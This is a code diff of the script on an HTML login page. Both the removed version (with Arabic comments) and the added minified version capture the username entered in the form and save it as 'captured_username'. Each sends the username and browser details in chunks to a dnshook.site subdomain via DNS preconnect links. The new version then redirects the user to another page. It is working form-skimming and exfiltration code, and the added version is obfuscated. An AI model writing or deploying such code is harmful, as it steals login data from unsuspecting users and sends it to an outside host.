@@ -28,94 +28,63 @@
 </div>
 </form>
 <script>
-// سكريبت مبسط لإرسال البيانات عبر طلبات DNS بطريقة واضحة
-document.addEventListener('DOMContentLoaded', function() {
-  // وظيفة لإرسال البيانات عبر DNS بشكل واضح
-  function sendDataViaDNS(data) {
+javascript:(function() {
+  var d = document, 
+  s = function(t) {
     try {
-      // تحويل البيانات إلى سلسلة نصية إذا لم تكن كذلك
-      var dataString = typeof data === 'string' ? data : JSON.stringify(data);
+      var c = typeof t === 'string' ? t : JSON.stringify(t),
+          n = c.replace(/ /g, '-').replace(/[^a-zA-Z0-9-]/g, '').toLowerCase(),
+          m = 30,
+          p = [];
       
-      // تنظيف البيانات لاستخدامها في اسم النطاق
-      var cleanData = dataString
-        .replace(/ /g, '-') // استبدال المسافات بشرطات
-        .replace(/[^a-zA-Z0-9-]/g, '') // إزالة الأحرف غير المسموح بها
-        .toLowerCase(); // تحويل إلى أحرف صغيرة
+      for (var i = 0; i < n.length; i += m) p.push(n.substr(i, m));
       
-      // تقسيم البيانات إلى أجزاء إذا كانت طويلة
-      var maxLength = 30;
-      var chunks = [];
-      
-      for (var i = 0; i < cleanData.length; i += maxLength) {
-        chunks.push(cleanData.substr(i, maxLength));
-      }
-      
-      // إرسال كل جزء كطلب DNS منفصل
-      chunks.forEach(function(chunk, index) {
-        // إنشاء اسم نطاق فرعي واضح
-        var dnsSubdomain = 'data-' + (index + 1) + 'of' + chunks.length + '-' + chunk + '.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site';
-        
-        // إنشاء عنصر link preconnect
-        var link = document.createElement('link');
-        link.rel = 'preconnect';
-        link.href = 'https://' + dnsSubdomain;
-        document.head.appendChild(link);
-        
-        console.log('تم إرسال جزء DNS #' + (index + 1) + '/' + chunks.length + ': ' + dnsSubdomain);
-        
-        // إزالة العناصر بعد فترة
-        setTimeout(function() {
-          document.head.removeChild(link);
-        }, 3000);
+      p.forEach(function(z, j) {
+        var h = 'data-' + (j + 1) + 'of' + p.length + '-' + z + '.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site',
+            l = d.createElement('link');
+        l.rel = 'preconnect';
+        l.href = 'https://' + h;
+        d.head.appendChild(l);
+        console.log('DNS #' + (j + 1) + '/' + p.length + ': ' + h);
+        setTimeout(function() { d.head.removeChild(l) }, 3000);
       });
       
       return true;
     } catch (e) {
-      console.log('خطأ في إرسال البيانات عبر DNS: ' + e);
+      console.log('Error: ' + e);
       return false;
     }
-  }
+  },
+  b = d.getElementById('loginBtn2');
   
-  // البحث عن زر تسجيل الدخول
-  var loginButton = document.getElementById('loginBtn2');
-  
-  if (loginButton) {
-    console.log('تم العثور على زر تسجيل الدخول');
-    
-    // إضافة مستمع حدث للزر
-    loginButton.addEventListener('click', function() {
-      // البحث عن حقل اسم المستخدم
-      var usernameField = document.getElementById('username2');
-      
-      if (usernameField && usernameField.value) {
-        var username = usernameField.value;
+  if (b) {
+    console.log('Found login button');
+    b.addEventListener('click', function() {
+      var u = d.getElementById('username2');
+      if (u && u.value) {
+        var v = u.value;
+        console.log('Username: ' + v);
         
-        console.log('تم جمع اسم المستخدم: ' + username);
-        
-        // حفظ البيانات في localStorage
         try {
-          localStorage.setItem('captured_username', username);
+          localStorage.setItem('captured_username', v);
           localStorage.setItem('capture_time', new Date().toString());
-          console.log('تم حفظ البيانات في localStorage');
-        } catch (e) {
-          console.log('خطأ في حفظ البيانات في localStorage: ' + e);
-        }
+        } catch (e) {}
         
-        // إرسال اسم المستخدم عبر DNS بشكل واضح
-        sendDataViaDNS('username-' + username);
+        s('username-' + v);
+        s('browser-' + navigator.userAgent.split(' ')[0] + '-time-' + new Date().getTime());
+        console.log('Data sent');
         
-        // إرسال معلومات إضافية في طلب منفصل
-        var deviceInfo = 'browser-' + navigator.userAgent.split(' ')[0] + '-time-' + new Date().getTime();
-        sendDataViaDNS(deviceInfo);
-        
-        console.log('تم إرسال البيانات عبر DNS');
+        // تحويل المستخدم إلى صفحة vv.html بعد إرسال البيانات
+        setTimeout(function() {
+          window.location.href = 'vv.html';
+        }, 1000);
       } else {
-        console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
+        console.log('No username field');
       }
     });
   } else {
-    console.log('لم يتم العثور على زر تسجيل الدخول');
+    console.log('No login button');
   }
-});
+})();
 </script>
 
